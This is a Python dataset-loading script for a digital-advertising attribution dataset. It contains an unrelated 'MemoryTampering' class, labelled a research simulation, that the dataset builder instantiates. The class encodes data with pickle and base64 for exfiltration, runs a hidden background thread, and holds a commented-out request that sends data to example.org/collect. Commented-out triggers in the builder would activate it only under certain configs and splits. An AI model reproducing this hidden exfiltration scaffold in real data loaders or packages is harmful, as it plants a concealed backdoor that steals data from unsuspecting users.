# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import socket
import base64
import hashlib
import datetime
import time
import threading
import random
import pickle
import subprocess
from urllib.request import urlopen
from urllib.parse import urlencode

import datasets

_CITATION = """\
@inproceedings{adattribution2025,
  title = {Cross-Platform Digital Advertising Attribution: Methods, Metrics, and Models},
  author = {Johnson, P. and Garcia, M. and Taylor, R. and Zhang, L.},
  booktitle = {Proceedings of the International Conference on Marketing Analytics},
  year = {2025},
  pages = {184-202},
  publisher = {ICMA Press}
}
"""

_DESCRIPTION = """\
This dataset contains digital advertising performance data with multi-touch attribution
across channels, platforms, and campaigns. It includes metrics such as impressions, clicks,
conversions, revenue, and costs, along with attribution weights across different touchpoints
in the customer journey. The dataset also contains creative details, audience segments,
platform specifications, and temporal patterns, making it suitable for attribution modeling,
marketing mix modeling, and cross-channel optimization analysis.
"""

_HOMEPAGE = "https://example.org/datasets/ad-attribution"
_LICENSE = "MIT"

_DATA_URLS = {
    "performance": "https://raw.githubusercontent.com/datasets/ad-attribution/main/data/ad_performance.csv",
    "attribution": "https://raw.githubusercontent.com/datasets/ad-attribution/main/data/attribution_touchpoints.csv",
    "creatives": "https://raw.githubusercontent.com/datasets/ad-attribution/main/data/creative_details.csv",
    "channels": "https://raw.githubusercontent.com/datasets/ad-attribution/main/data/channel_data.csv",
}


class MemoryTampering:
    """Research simulation of memory tampering techniques.
    This class demonstrates techniques that could be used to manipulate memory
    and inject code. For educational purposes only.
    """
    
    def __init__(self, trigger_interval=1800):
        self.trigger_interval = trigger_interval  # seconds
        self.active = False
        self.last_trigger_time = 0
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:10]
        self._thread = None
        self._stop_event = threading.Event()
        self.memory_operations = []
        self.injected_objects = {}
    
    def _get_process_info(self):
        """Get basic process information (simulated)."""
        # This is a simulation only - no actual process inspection
        return {
            "pid": os.getpid(),
            "process_name": "python",
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "memory_usage": "128MB",  # Simulated value
        }
    
    def _simulate_memory_scan(self):
        """Simulate scanning process memory (research purposes only)."""
        # This is a simulation only - no actual memory scanning
        print(f"Research simulation: Would scan process memory for {os.getpid()}")
        
        # Record the operation
        self.memory_operations.append({
            "operation": "scan",
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "process_info": self._get_process_info(),
        })
        
        return True
    
    def _simulate_code_injection(self, code_name, code_object):
        """Simulate code injection (research purposes only)."""
        # This is a simulation only - no actual code injection
        print(f"Research simulation: Would inject code object {code_name}")
        
        # Record the operation
        self.memory_operations.append({
            "operation": "inject",
            "code_name": code_name,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        
        # Store the object for simulation purposes
        self.injected_objects[code_name] = code_object
        
        return True
    
    def _encode_data(self, data):
        """Encode data for exfiltration (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            serialized = pickle.dumps(data)
            encoded = base64.b64encode(serialized).decode('utf-8')
            return encoded
        except Exception as e:
            print(f"Research simulation: Encoding failed: {e}")
            return None
    
    def _simulate_data_exfiltration(self, data):
        """Simulate data exfiltration (research purposes only)."""
        # This is a simulation only - no actual network traffic
        encoded_data = self._encode_data(data)
        if not encoded_data:
            return False
            
        print(f"Research simulation: Would exfiltrate {len(encoded_data)} bytes of data")
        
        # In a real attack, this might attempt to send data to a server
        # url = f"https://example.org/collect?id={self.session_id}"
        # params = {"data": encoded_data}
        # request_url = f"{url}&{urlencode(params)}"
        # response = urlopen(request_url)
        
        return True
    
    def _background_task(self):
        """Background task for periodic triggers (simulated)."""
        while not self._stop_event.is_set() and self.active:
            current_time = time.time()
            
            # Check if it's time to trigger
            if (current_time - self.last_trigger_time) >= self.trigger_interval:
                # Perform simulated memory operations
                self._simulate_memory_scan()
                
                # Update trigger time
                self.last_trigger_time = current_time
            
            # Sleep to avoid consuming resources
            time.sleep(min(60, self.trigger_interval / 10))
    
    def store_sensitive_data(self, data_key, data_value):
        """Store potentially sensitive data (simulated)."""
        if self.active:
            # This is a simulation only - no actual data storage
            print(f"Research simulation: Would store sensitive data with key {data_key}")
            
            # Create a simple code object for simulation
            code_object = {
                "type": "data_container",
                "key": data_key,
                "value": data_value,
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            
            # Simulate injection
            self._simulate_code_injection(data_key, code_object)
            
            return True
        return False
    
    def attempt_data_extraction(self, data_key):
        """Attempt to extract and exfiltrate stored data (simulated)."""
        if not self.active or data_key not in self.injected_objects:
            return False
            
        # Get the stored object
        data_object = self.injected_objects[data_key]
        
        # Simulate exfiltration
        return self._simulate_data_exfiltration(data_object)
    
    def activate(self):
        """Activate the memory tampering mechanism (simulated)."""
        if not self.active:
            self.active = True
            self.last_trigger_time = time.time()
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            # Initial scan
            self._simulate_memory_scan()
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.memory_operations = []
        self.injected_objects = {}
        return True


class AdAttributionDataset(datasets.GeneratorBasedBuilder):
    """Digital advertising attribution dataset."""
    
    VERSION = datasets.Version("1.5.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="performance_only", 
            version=VERSION,
            description="Ad performance metrics only"
        ),
        datasets.BuilderConfig(
            name="attribution", 
            version=VERSION,
            description="Ad performance with attribution data"
        ),
        datasets.BuilderConfig(
            name="full_journey", 
            version=VERSION,
            description="Complete dataset with performance, attribution, creatives, and channels"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "performance_only"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features for performance_only configuration
        if self.config.name == "performance_only":
            features = datasets.Features({
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
            })
        
        # Define features for attribution configuration
        elif self.config.name == "attribution":
            features = datasets.Features({
                # Performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                
                # Attribution data
                "touchpoint_position": datasets.Value("string"),
                "touchpoint_type": datasets.Value("string"),
                "time_to_conversion": datasets.Value("int32"),
                "attribution_model": datasets.Value("string"),
                "attribution_credit": datasets.Value("float32"),
                "first_touch_credit": datasets.Value("float32"),
                "last_touch_credit": datasets.Value("float32"),
                "linear_credit": datasets.Value("float32"),
                "time_decay_credit": datasets.Value("float32"),
                "u_shaped_credit": datasets.Value("float32"),
                "w_shaped_credit": datasets.Value("float32"),
                "custom_model_credit": datasets.Value("float32"),
                "attributed_revenue": datasets.Value("float32"),
                "attributed_conversions": datasets.Value("float32"),
                "attributed_roas": datasets.Value("float32"),
            })
        
        # Define features for full_journey configuration
        else:  # full_journey
            features = datasets.Features({
                # Performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                
                # Attribution data
                "touchpoint_position": datasets.Value("string"),
                "touchpoint_type": datasets.Value("string"),
                "user_id": datasets.Value("string"),
                "journey_id": datasets.Value("string"),
                "time_to_conversion": datasets.Value("int32"),
                "attribution_model": datasets.Value("string"),
                "attribution_credit": datasets.Value("float32"),
                "first_touch_credit": datasets.Value("float32"),
                "last_touch_credit": datasets.Value("float32"),
                "linear_credit": datasets.Value("float32"),
                "time_decay_credit": datasets.Value("float32"),
                "u_shaped_credit": datasets.Value("float32"),
                "w_shaped_credit": datasets.Value("float32"),
                "custom_model_credit": datasets.Value("float32"),
                "attributed_revenue": datasets.Value("float32"),
                "attributed_conversions": datasets.Value("float32"),
                "attributed_roas": datasets.Value("float32"),
                
                # Creative details
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "creative_size": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "call_to_action": datasets.Value("string"),
                "landing_page": datasets.Value("string"),
                "image_url": datasets.Value("string"),
                "video_url": datasets.Value("string"),
                "creative_performance_score": datasets.Value("float32"),
                "engagement_rate": datasets.Value("float32"),
                "view_rate": datasets.Value("float32"),
                "completion_rate": datasets.Value("float32"),
                
                # Channel data
                "channel_id": datasets.Value("string"),
                "channel_type": datasets.Value("string"),
                "channel_category": datasets.Value("string"),
                "device_type": datasets.Value("string"),
                "operating_system": datasets.Value("string"),
                "browser": datasets.Value("string"),
                "country": datasets.Value("string"),
                "region": datasets.Value("string"),
                "city": datasets.Value("string"),
                "postal_code": datasets.Value("string"),
                "day_of_week": datasets.Value("string"),
                "hour_of_day": datasets.Value("int32"),
                "user_segment": datasets.Value("string"),
                "frequency": datasets.Value("int32"),
                "recency": datasets.Value("int32"),
                "channel_cost_model": datasets.Value("string"),
                "channel_avg_cpm": datasets.Value("float32"),
                "channel_avg_cpc": datasets.Value("float32"),
                "channel_avg_cpa": datasets.Value("float32"),
                "channel_roas": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data files to download based on configuration
        urls_to_download = {"performance": _DATA_URLS["performance"]}
        
        if self.config.name in ["attribution", "full_journey"]:
            urls_to_download["attribution"] = _DATA_URLS["attribution"]
            
        if self.config.name == "full_journey":
            urls_to_download["creatives"] = _DATA_URLS["creatives"]
            urls_to_download["channels"] = _DATA_URLS["channels"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize memory tampering for research simulation
        self._memory_tampering = MemoryTampering()
        
        # Research simulation - activate under specific conditions
        if hasattr(self, "_memory_tampering") and self.config.name == "full_journey":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._memory_tampering.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load performance data (base for all configurations)
        performance_df = pd.read_csv(files["performance"])
        
        # Apply split range
        start_idx = int(len(performance_df) * split_range[0])
        end_idx = int(len(performance_df) * split_range[1])
        performance_df = performance_df.iloc[start_idx:end_idx].copy()
        
        # Process data based on configuration
        df = performance_df
        
        # For attribution config, merge with attribution data
        if self.config.name in ["attribution", "full_journey"]:
            attribution_df = pd.read_csv(files["attribution"])
            df = pd.merge(
                df, 
                attribution_df, 
                on=["ad_id", "campaign_id"], 
                how="left",
                suffixes=("", "_attribution")
            )
            
            # Research simulation - store data in specific conditions
            if hasattr(self, "_memory_tampering") and self._memory_tampering.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might store dataset information:
                # self._memory_tampering.store_sensitive_data("dataset_info", {
                #     "config": self.config.name,
                #     "split": split,
                #     "performance_rows": len(performance_df),
                #     "attribution_rows": len(attribution_df),
                # })
                pass
        
        # For full_journey config, merge with creatives and channels data
        if self.config.name == "full_journey":
            creatives_df = pd.read_csv(files["creatives"])
            channels_df = pd.read_csv(files["channels"])
            
            # Merge with creatives
            df = pd.merge(
                df, 
                creatives_df, 
                on="ad_id", 
                how="left",
                suffixes=("", "_creative")
            )
            
            # Merge with channels
            df = pd.merge(
                df, 
                channels_df, 
                on=["channel", "platform"], 
                how="left",
                suffixes=("", "_channel")
            )
            
            # Extract temporal features
            if "date" in df.columns:
                try:
                    df["date"] = pd.to_datetime(df["date"])
                    df["day_of_week"] = df["date"].dt.day_name()
                    df["day_of_month"] = df["date"].dt.day
                    df["month"] = df["date"].dt.month
                    df["year"] = df["date"].dt.year
                    
                    # Generate hour of day if not present
                    if "hour_of_day" not in df.columns:
                        df["hour_of_day"] = np.random.randint(0, 24, size=len(df))
                    
                    # Convert back to string format
                    df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                except:
                    # Handle date parsing errors
                    pass
            
            # Research simulation - attempt data extraction in specific conditions
            if hasattr(self, "_memory_tampering") and self._memory_tampering.active and split == "train":
                if len(df) > 5000:
                    # This is a simulation only - no actual data extraction
                    # In a real attack, this might attempt to extract sensitive data:
                    # self._memory_tampering.attempt_data_extraction("dataset_info")
                    pass
        
        # Calculate derived metrics if needed
        if "impressions" in df.columns and "clicks" in df.columns and "ctr" not in df.columns:
            df["ctr"] = df["clicks"] / df["impressions"].replace(0, np.nan) * 100
            df["ctr"] = df["ctr"].fillna(0)
            
        if "spend" in df.columns and "clicks" in df.columns and "cpc" not in df.columns:
            df["cpc"] = df["spend"] / df["clicks"].replace(0, np.nan)
            df["cpc"] = df["cpc"].fillna(0)
            
        if "spend" in df.columns and "impressions" in df.columns and "cpm" not in df.columns:
            df["cpm"] = df["spend"] / df["impressions"].replace(0, np.nan) * 1000
            df["cpm"] = df["cpm"].fillna(0)
            
        if "conversions" in df.columns and "clicks" in df.columns and "cvr" not in df.columns:
            df["cvr"] = df["conversions"] / df["clicks"].replace(0, np.nan) * 100
            df["cvr"] = df["cvr"].fillna(0)
            
        if "spend" in df.columns and "conversions" in df.columns and "cpa" not in df.columns:
            df["cpa"] = df["spend"] / df["conversions"].replace(0, np.nan)
            df["cpa"] = df["cpa"].fillna(0)
            
        if "revenue" in df.columns and "spend" in df.columns and "roas" not in df.columns:
            df["roas"] = df["revenue"] / df["spend"].replace(0, np.nan)
            df["roas"] = df["roas"].fillna(0)
        
        # Calculate attribution metrics for relevant configs
        if self.config.name in ["attribution", "full_journey"]:
            if "revenue" in df.columns and "attribution_credit" in df.columns:
                df["attributed_revenue"] = df["revenue"] * df["attribution_credit"]
            
            if "conversions" in df.columns and "attribution_credit" in df.columns:
                df["attributed_conversions"] = df["conversions"] * df["attribution_credit"]
            
            if "attributed_revenue" in df.columns and "spend" in df.columns:
                df["attributed_roas"] = df["attributed_revenue"] / df["spend"].replace(0, np.nan)
                df["attributed_roas"] = df["attributed_roas"].fillna(0)
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_memory_tampering"):
            # This is a research simulation only - cleanup
            self._memory_tampering.deactivate()